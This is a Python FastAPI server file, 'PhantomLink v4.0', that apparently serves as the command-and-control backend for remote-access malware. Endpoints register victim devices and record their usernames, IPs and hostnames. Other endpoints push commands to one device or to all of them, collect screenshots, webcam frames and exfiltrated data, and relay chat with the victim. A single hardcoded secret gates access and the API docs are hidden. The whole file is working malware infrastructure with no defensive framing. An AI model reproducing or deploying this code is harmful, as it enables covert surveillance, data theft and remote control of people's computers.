# main.py | PhantomLink v4.0 | FastAPI | Render
# requirements.txt: fastapi uvicorn pydantic

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import time, threading, json

app = FastAPI(title="PhantomLink", docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware,
    allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SECRET         = "phantomlink2025"
DEVICE_TIMEOUT = 30

devices     = {}   # did -> info
commands    = {}   # did -> {action, data}
screenshots = {}   # did -> b64
cam_frames  = {}   # did -> b64
data_store  = {}   # did -> [items]
chat_msgs   = {}   # did -> [msgs]   controller->client
chat_reply  = {}   # did -> [msgs]   client->controller
_lk = threading.Lock()

def _auth(s):
    if s != SECRET:
        raise HTTPException(403, "forbidden")

class HB(BaseModel):
    secret:str; device_id:str; username:str; ip:str
    version:str="?"; hostname:str=""; os_info:str=""

class Send(BaseModel):
    secret:str; action:str; data:str=""; target:str="all"

class SS(BaseModel):
    secret:str; device_id:str; image:str

class CF(BaseModel):
    secret:str; device_id:str; image:str

class Data(BaseModel):
    secret:str; device_id:str; type:str; payload:str

class Chat(BaseModel):
    secret:str; device_id:str; msg:str; sender:str="controller"

@app.get("/")
def root(): return {"status":"PhantomLink v4.0 online"}

@app.get("/ping")
def ping(): return {"ok":True,"ts":time.time()}

@app.post("/heartbeat")
def heartbeat(b:HB):
    _auth(b.secret)
    with _lk:
        devices[b.device_id]={
            "name":b.username,"ip":b.ip,"version":b.version,
            "hostname":b.hostname,"os":b.os_info,"last_seen":time.time()
        }
        if b.device_id not in commands:
            commands[b.device_id]={"action":"none","data":""}
    return {"ok":True}

@app.get("/poll")
def poll(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        cmd=commands.get(device_id,{"action":"none","data":""})
        commands[device_id]={"action":"none","data":""}
    return cmd

@app.post("/send")
def send(b:Send):
    _auth(b.secret)
    cmd={"action":b.action,"data":b.data}
    with _lk:
        if b.target=="all":
            for did in devices: commands[did]=cmd
        else:
            commands[b.target]=cmd
    return {"ok":True}

@app.get("/devices")
def list_devices(secret:str):
    _auth(secret)
    now=time.time()
    with _lk:
        return {did:{**info,"online":(now-info["last_seen"])<DEVICE_TIMEOUT}
                for did,info in devices.items()}

@app.post("/screenshot")
def upload_ss(b:SS):
    _auth(b.secret)
    with _lk: screenshots[b.device_id]=b.image
    return {"ok":True}

@app.get("/screenshot")
def get_ss(secret:str, device_id:str):
    _auth(secret)
    with _lk: return {"image":screenshots.get(device_id)}

@app.post("/camframe")
def upload_cam(b:CF):
    _auth(b.secret)
    with _lk: cam_frames[b.device_id]=b.image
    return {"ok":True}

@app.get("/camframe")
def get_cam(secret:str, device_id:str):
    _auth(secret)
    with _lk: return {"image":cam_frames.get(device_id)}

@app.post("/data")
def upload_data(b:Data):
    _auth(b.secret)
    with _lk:
        bucket=data_store.setdefault(b.device_id,[])
        bucket.append({"type":b.type,"payload":b.payload,"ts":time.time()})
        if len(bucket)>30: data_store[b.device_id]=bucket[-30:]
    return {"ok":True}

@app.get("/data")
def get_data(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        items=list(data_store.get(device_id,[]))
        data_store[device_id]=[]
    return {"items":items}

@app.post("/chat")
def post_chat(b:Chat):
    _auth(b.secret)
    with _lk:
        if b.sender=="controller":
            bucket=chat_msgs.setdefault(b.device_id,[])
            bucket.append({"msg":b.msg,"ts":time.time()})
            if len(bucket)>50: chat_msgs[b.device_id]=bucket[-50:]
        else:
            bucket=chat_reply.setdefault(b.device_id,[])
            bucket.append({"msg":b.msg,"ts":time.time()})
            if len(bucket)>50: chat_reply[b.device_id]=bucket[-50:]
    return {"ok":True}

@app.get("/chat")
def get_chat(secret:str, device_id:str, sender:str="controller"):
    _auth(secret)
    with _lk:
        if sender=="controller":
            msgs=list(chat_msgs.get(device_id,[]))
            chat_msgs[device_id]=[]
        else:
            msgs=list(chat_reply.get(device_id,[]))
            chat_reply[device_id]=[]
    return {"msgs":msgs}
    
